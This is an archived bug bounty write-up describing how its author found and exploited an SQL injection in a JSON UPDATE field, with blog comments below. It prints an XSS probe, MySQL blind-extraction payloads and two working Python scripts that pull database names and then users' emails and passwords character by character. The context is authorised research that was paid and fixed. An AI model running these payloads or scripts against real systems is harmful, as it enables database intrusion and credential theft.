---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-02-17_sql-injection-in-an-update-query-a-bug-bounty-story.md
original_filename: 2017-02-17_sql-injection-in-an-update-query-a-bug-bounty-story.md
title: SQL injection in an UPDATE query - a bug bounty story!
category: documents
detected_topics:
- xss
- sqli
- command-injection
- mfa
- api-security
tags:
- imported
- documents
- xss
- sqli
- command-injection
- mfa
- api-security
language: en
raw_sha256: 753fea3507d6d120cc900d8571855a26c6bca085656d917ee905d53370e9d747
text_sha256: a7fa32af6c605fad75112e0b92980b67ada2382a5a001e0a33619a3e9694311f
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: true
---

# SQL injection in an UPDATE query - a bug bounty story!

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-02-17_sql-injection-in-an-update-query-a-bug-bounty-story.md
- Source Type: markdown
- Detected Topics: xss, sqli, command-injection, mfa, api-security
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: True
- Raw SHA256: `753fea3507d6d120cc900d8571855a26c6bca085656d917ee905d53370e9d747`
- Text SHA256: `a7fa32af6c605fad75112e0b92980b67ada2382a5a001e0a33619a3e9694311f`


## Content

---
title: "SQL injection in an UPDATE query - a bug bounty story!"
url: "http://mahmoudsec.blogspot.com/2017/02/sql-injection-in-update-query-bug.html"
final_url: "http://mahmoudsec.blogspot.com/2017/02/sql-injection-in-update-query-bug.html"
authors: ["Mahmoud Gamal (@Zombiehelp54)"]
bugs: ["SQL injection"]
publication_date: "2017-02-17"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6223
---

###  SQL injection in an UPDATE query - a bug bounty story! 

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

[ February 17, 2017  ](http://mahmoudsec.blogspot.com/2017/02/sql-injection-in-update-query-bug.html "permanent link")

What's up whoever reading this! been a long time since I last posted something here.  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUG-ZKPccUNWCOTFa5LXrxvdPoR5KEBNAcVdSG_GSMTW7BbSA0fTArDz0dXJPHcr5AXuHupGzVJJ33N3XVHgakX_Njqqd30wK1iQsxSqaFKucLDMMjikMSiDBULCxtQ0VIHzoV54a2gQYU/s400/464297.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUG-ZKPccUNWCOTFa5LXrxvdPoR5KEBNAcVdSG_GSMTW7BbSA0fTArDz0dXJPHcr5AXuHupGzVJJ33N3XVHgakX_Njqqd30wK1iQsxSqaFKucLDMMjikMSiDBULCxtQ0VIHzoV54a2gQYU/s1600/464297.png)

  

Today, I will be writing about a SQL injection vulnerability I recently found.

  

As usual, at a hacking night after drinking my favorite cookie frappe I picked up a bug bounty program and started testing.

  

Like any other researcher, I was throwing XSS payloads randomly everywhere. (I usually use '"><img src=x onerror=alert(2) x= with a single quote at the beginning) and while doing so one of the endpoints returned a 500 error saying A SQL error was encountered which definitely attracted my attention.

  

The field returned that error was my `full name` so I went back there and immediately tried test'test which returned the same error which means that the single quote is what is causing the problem here.

Realizing that, it seemed to me that single quotes weren't escaped at the SQL query, so I tried to escape it for them(by doubling it) and see what happens. So I entered test''test and I was shocked that the error disappeared and my name was changed to test'test !

  

Since the vulnerable field is used to edit the user's full name, I guessed that the vulnerable query is UPDATE. So I changed my name to '+ @@VERSION +'  and after reloading the page my name was changed to 5.6 which is the MySQL dbms version!

  

Note that it's a JSON request so `+` here does not represent a space(%20).

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh4RzvxBiJYvD8un_gyOqXwANBdjZJgJ6oKhsFXPs-6urOLig2YGp4TDbxjh4Oq_14UcfQTnspGJPREdy7bZwP90d79JiJpq5k_WoeoihllaZaLXN7zyhxQjSZT62-IxdF6ZWF7-LIWY09n/s640/aaaaaa.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh4RzvxBiJYvD8un_gyOqXwANBdjZJgJ6oKhsFXPs-6urOLig2YGp4TDbxjh4Oq_14UcfQTnspGJPREdy7bZwP90d79JiJpq5k_WoeoihllaZaLXN7zyhxQjSZT62-IxdF6ZWF7-LIWY09n/s1600/aaaaaa.png)

  

  

I reported what I have found so far and the vendor replied asking me to go further and extract data from the database.

  

Extracting data with this SQL injection seemed hard as whenever I try to extract a string the returned values were 0 because there is no concatenation for two strings using `+` in mysql.

  

If the server was SQL server it would be pretty easy since i can join the two strings easily using `+` for example 'x'+ @@VERSION + ' x ' would have updated my name to x5x (5 here is the dbms veraion).

  

However, it was a mysql server and in mysql `+` is used for summing numbers, that's why 'x'+version()+'x' was returning 5.6 , since it summed 0+5.6+0 as the integer value of a string is `0` 

  

so other payloads like 'x'+user()+'x' will always return 0 since the user name is a string and `+` can only be used for summing numbers as explained. 

  

that makes the only possible way to get the value of the string is by converting it to a number, hence I used ASCII() to convert the string to its ASCII equivalent number then after that I would grab the response and convert it from ASCII to text.

  

'+ length(user()) # \--> to get length of the string to be retrieved

'+ ASCII(substr(user(),1)) # \--> to get the first char of the string to be retrived 

'+ ASCII(substr(user(),2)) # \--> to get the second char of the string to be retrived 

'+ ASCII(substr(user(),3)) # \--> to get the thrird char of the string to be retrived 

and so on...

  

This seemed to be so annoying to do manually as I will have to use substr() to convert every single character in the response to its equivalent ASCII value then convert it back to text since MySQL ASCII function will return numeric value of left-most character.

  

With that said, I decided to write a simple python script that will extract and convert to text automatically.

  

  
  
  import requests
  rheaders = {} # Request headers
  rcookies = {} # Request cookies
  url = 'https://<target>/api/v1/' # Vulnerable endpoint
  len = 1000 # length of the string (using 1000 assuming that it won't be more than that, going out of the string length will return 0 at that moment we know that we got the full string)
  column = 'schema_name' # what to return
  table = 'information_schema.schemata' # from what
  orderby = 'schema_name'
  d=''
  start = 0
  end = 20
  for l in range(start,end):
  limit = l
  print 'Retrieving '+column+' at row ' + str(limit+1) + '...'
  if l > start and d == '':
  break
  d=''
  for i in range(1,len):
  r = requests.put(url, json={"fullname":"' - (select ASCII(substr("+column+","+str(i)+")) from "+table+" order by "+orderby+" limit "+str(limit)+",1) #"},headers=rheaders,cookies=rcookies)
  b = requests.get(url,cookies=rcookies).content.split('fullname":"',1)[1][:5] # Get the returned value
  n = filter(lambda b:b>='0' and b<='9', b)
  d += chr(int(n)) # Convert ASCII number to equivalent character
  
  #print d
  if n == '0':
  print column + ' at row ' + str(limit+1)+' :- ', d
  break
  

  

Now using that script I could easily extract any data from the database by changing the values of `column` , `table` and `orderby` variables.

  

Here is a screenshot of getting current databases the user has access to: 

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEimpMJMEu5N-4xObJ8jZKg3T9FBDBtgiVeb1wOMYa6hDYwNg2bZ2oVtobzTbMZ-bLW9oMwgF5VE2HrDcs7iP3VNBaBo0u7juGQ3u6uzg0dqA372TxhsIOMReKJhAVeRTsaq10769KjJsZ4j/s640/a4e9c013a607bb0c8b86941afcf032face40fb06-original.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEimpMJMEu5N-4xObJ8jZKg3T9FBDBtgiVeb1wOMYa6hDYwNg2bZ2oVtobzTbMZ-bLW9oMwgF5VE2HrDcs7iP3VNBaBo0u7juGQ3u6uzg0dqA372TxhsIOMReKJhAVeRTsaq10769KjJsZ4j/s1600/a4e9c013a607bb0c8b86941afcf032face40fb06-original.png)

  

With a little modification, I could extract users' emails and passwords using ASCII(substr(concat(email_address,0x3a,password),i)))

  

  
  
  import requests
  rheaders = {}
  rcookies = {}
  url = 'https://<target>/api/v1/'
  d = ""
  len = 1000 
  limit = 400000
  print 'Retrieving email and pass at row', limit
  for i in range(1,len):
  r = requests.put(url, json={"fullname":"' - (select ASCII(substr(concat(email_address,0x3a,password),"+str(i)+")) from __users limit "+str(limit)+",1) #"},headers=rheaders,cookies=rcookies)
  b = requests.get(url,cookies=rcookies).content.split('fullname":"',1)[1][:5]
  n = filter(lambda b:b>='0' and b<='9', b) 
  d += chr(int(n)) 
  print d
  if n == '0':
  print "Email:Password=***REDACTED*** ", d
  break
  

  

and after running the script:

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7FJLlEuNTpShqzD87JWDkw0Qb21kPh6tb7tp4AAGs-JDiqOIY0uwSgAymooSh65J4Fpa9zVPYG6DVKrl6wGbRHQFY3IebVhfCFUprtSJ4xE02C_d9EgHQrUAYaP_jx09LjtpgY2tWvcX3/s640/d879974a86a7cf0c6558742c8c51f342dab742aa-original.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7FJLlEuNTpShqzD87JWDkw0Qb21kPh6tb7tp4AAGs-JDiqOIY0uwSgAymooSh65J4Fpa9zVPYG6DVKrl6wGbRHQFY3IebVhfCFUprtSJ4xE02C_d9EgHQrUAYaP_jx09LjtpgY2tWvcX3/s1600/d879974a86a7cf0c6558742c8c51f342dab742aa-original.png)

  

Timeline:

\- 14/2/2017 10:25 PM --> First submission

\- 14/2/2017 11:02 PM --> The vendor asked to go further and extract data

\- 15/2/2017 3:00 AM --> Resubmitted with the python script PoC

\- 15/2/2017 10:22 AM --> Submitted more vulnerable parameters

\- 15/2/2017 3:28 PM --> Nice Bounty awarded

\- 15/2/2017 10:18 PM --> Vulnerability fixed

  

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

### Comments

  1. ![](//resources.blogblog.com/img/blank.gif)

Anonymous[February 19, 2017 at 11:23 PM](http://mahmoudsec.blogspot.com/2017/02/sql-injection-in-update-query-bug.html?showComment=1487575424657#c421059789714762662)

Hi there,  
can you ping me ?

Reply[Delete](https://www.blogger.com/comment/delete/277132840497237240/421059789714762662)

Replies

Reply

  2. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[walid](https://www.blogger.com/profile/04711582251244234831)[March 29, 2017 at 1:54 PM](http://mahmoudsec.blogspot.com/2017/02/sql-injection-in-update-query-bug.html?showComment=1490820891719#c4973545446868874287)

hi can u help me  

Reply[Delete](https://www.blogger.com/comment/delete/277132840497237240/4973545446868874287)

Replies

Reply

  3. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Unknown](https://www.blogger.com/profile/09363573767302942145)[September 23, 2017 at 7:15 AM](http://mahmoudsec.blogspot.com/2017/02/sql-injection-in-update-query-bug.html?showComment=1506176121187#c419641201986009026)

It was amazing. 

Reply[Delete](https://www.blogger.com/comment/delete/277132840497237240/419641201986009026)

Replies

Reply

  4. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Ahmed](https://www.blogger.com/profile/09206741887589272334)[February 15, 2018 at 3:04 PM](http://mahmoudsec.blogspot.com/2017/02/sql-injection-in-update-query-bug.html?showComment=1518735869857#c3132813953533699457)

that amazing , so smart guy

Reply[Delete](https://www.blogger.com/comment/delete/277132840497237240/3132813953533699457)

Replies

Reply

  5. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[dhramik](https://www.blogger.com/profile/04662952961975439793)[March 22, 2020 at 12:14 AM](http://mahmoudsec.blogspot.com/2017/02/sql-injection-in-update-query-bug.html?showComment=1584861292363#c132555823886317242)

free Adsence Course Download [here](https://worldwebcourse.online/google-adsense-and-web-traffic-growth-bootcamp-2020-course-site/)

Reply[Delete](https://www.blogger.com/comment/delete/277132840497237240/132555823886317242)

Replies

Reply

Add comment

Load more...

#### Post a Comment

[](https://www.blogger.com/comment/frame/277132840497237240?po=3168122466374951804&hl=en&saa=85391&origin=http://mahmoudsec.blogspot.com&skin=contempo)
